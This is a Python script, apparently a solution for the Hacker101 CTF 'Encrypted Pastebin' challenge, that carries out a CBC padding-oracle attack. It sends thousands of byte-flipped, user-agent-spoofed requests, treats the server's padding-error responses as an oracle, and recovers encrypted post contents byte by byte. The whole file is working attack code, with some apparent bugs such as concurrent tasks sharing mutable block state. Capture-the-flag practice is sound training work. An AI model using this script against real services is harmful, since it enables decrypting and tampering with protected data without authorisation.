#!venv/bin/python3 
import requests
import fake_useragent
import base64
import time
import copy
import asyncio
import aiohttp

url="https://e1aee1cd19f42aae4427a7975792802d.ctf.hacker101.com/?post=0DX0U-Q4lwggk97pxPQ!hE-WhVs2TKjs32CIdbDw9NhuDA5RlH0jI5xmOH0hklx63aORQF4eVrQZfGkOkbWdGYpG-wZci9UmbtZ-zZ3r4LnFyqhY4jxdHXQ9Wc-GLuPEVfXCVOewL0BDjgp3m0RvKpnAlnscdbJDAb8ovUphXLpPZD6NZA9pqnaZ8o7rx71Aq8nzsGav4xF8ttdJvqbHXg~~"
domain=url.split("?")[0]
params=url.split("=")[1]
ua = fake_useragent.UserAgent()
n=32

#Get the hex from the fake b64 param.
data=base64.b64decode(params.replace("~", "=").replace("-", "+").replace("!", "/"))
data=int.from_bytes(data, byteorder="big")
data=f"{data:x}"
print(data)
blocks= list(map(bytearray.fromhex, [data[i:i+n] for i in range(0, len(data), n)]))
original_block = copy.deepcopy(blocks)

async def padding_correct(response):
    text = await response.text()
    if "Encrypted Pastebin" in text:
        return True
    elif "PaddingException" in text:
        return False
    elif "Traceback" in text:
        return True 
    else:
        print(text)
        raise Exception("Weird response from the Oracle.")

def hex_to_url_b64(dump):
    #print(dump)
    return base64.b64encode(bytes.fromhex(dump)).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')

def blocks_to_dump(blocks):
    return ''.join([f"{int.from_bytes(block, byteorder='big'):032x}" for block in blocks])

def tune_padding(byte_array, block):
    padding_length = len(byte_array)
    # n^m=p {n=original ciphered block n-1, m=changed ciphered block n-1 for the padding, p=the padding}
    print(f"\033[36mHave to tune {str(padding_length)} paddings before permutating the current position.\033[0m")
    for to_change in range(padding_length):
        print(f"\033[36mChanging {blocks[block][16-(to_change+1)]} to be... 0x{padding_length:02x} on the +1 block.\033[0m")
        print(f"\033[36mThe original value of the plaintex was\033[0m")
        original_value = blocks[block][16-to_change-1]^original_block[block][16-to_change-1]^padding_length
        print(blocks[block][16-to_change-1],original_block[block][16-to_change-1],padding_length)
        print(blocks[block][16-to_change-1])
        print(f"Now we change it to {padding_length+1}")
        blocks[block][16-to_change-1] = original_block[block][16-to_change-1]^original_value^(padding_length+1)
        print(blocks[block][16-to_change-1])

def get_plaintext(byte_position, block, plaintext):
    # n^m^p = t {n=ciphered original block n-1, m=changed ciphered block n-1 for the correct padding, p=the padding, t=plaintext}
    n = blocks[block][byte_position]
    m = original_block[block][byte_position]
    p = 16-byte_position
    print(n,m,p)
    plainchar = n^m^p
    print(f"The plaintext here was {plainchar}")
    plaintext.append(plainchar)
    print(f"\033[33mThe current plaintext string is {plaintext}")

# >3 oracle
async def call_oracle(session, domain, payload):
    async with session.get(url=f"{domain}?post={payload}", headers={"User-Agent": ua.chrome}) as response:
        return await padding_correct(response) 

async def decipher_block(session, block):
    print("hola")
    await asyncio.sleep(5)
    print("bye")
    guesses = bytearray()
    plaintext = bytearray()

    for byte_position in reversed(range(16)):
        # Store original byte from restoring it back later
        original_byte = blocks[block][byte_position]
        # pre
        if byte_position<15:
            print(guesses)
            tune_padding(guesses, block)
        for i in range(256):
            blocks[block][byte_position] = i
            payload=hex_to_url_b64(blocks_to_dump([blocks[block], blocks[block+1]]))
            print(payload)
            if await call_oracle(session, domain, payload):
                print(f"\033[33m[+++][====]Possible with the byte {hex(i)}[=+===+==]\033[0m")
                if byte_position == 15:
                    print(f"\033[33mWe are on the last byte, so we have to check if this byte makes the padding 0x01 or 0x02..0xFF\033[0m")
                    print(f"\033[34mPrevious block = {blocks[block][byte_position-1]}\033[0m")
                    blocks[block][byte_position-1]+=1
                    print(f"\033[34mPrevious block (updated) = {blocks[block][byte_position-1]}\033[0m")
                    payload=hex_to_url_b64(blocks_to_dump(blocks))
                    if await call_oracle(session, domain, payload):
                        print("\033[32m0x01 padding found!\033[0m")
                        guesses.append(i)
                        get_plaintext(byte_position, block, plaintext)
                        break
                    else:
                        print("\033[35mPossible 0x02...0xFF, not adding the bytes.\033[0m")
                    blocks[block][byte_position-1]-=1
                    print(f"\033[34mPrevious block back to it's original value ({blocks[block][byte_position-1]})\033[0m")
                else:  
                    guesses.append(i)
                    get_plaintext(byte_position, block, plaintext)
                    break
            else:
                print(f"\033[31mTrying with byte value {hex(blocks[block][byte_position])} ({i}) on the {byte_position}th position of the {block}th block.\033[0m")
        # Restore value of the permuted byte
        blocks[block][byte_position] = original_byte
    return plaintext

async def main():
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit_per_host=10),timeout=aiohttp.ClientTimeout(total=20)) as session:
        tasks = []
        tasks_done = []
        print("done")
        for block in reversed(range(1, len(blocks)-2)):
            tasks.append(asyncio.ensure_future(decipher_block(session, block)))
        tasks_done = await asyncio.gather(*tasks)  
        for result in tasks_done:
            print(result)

asyncio.run(main())
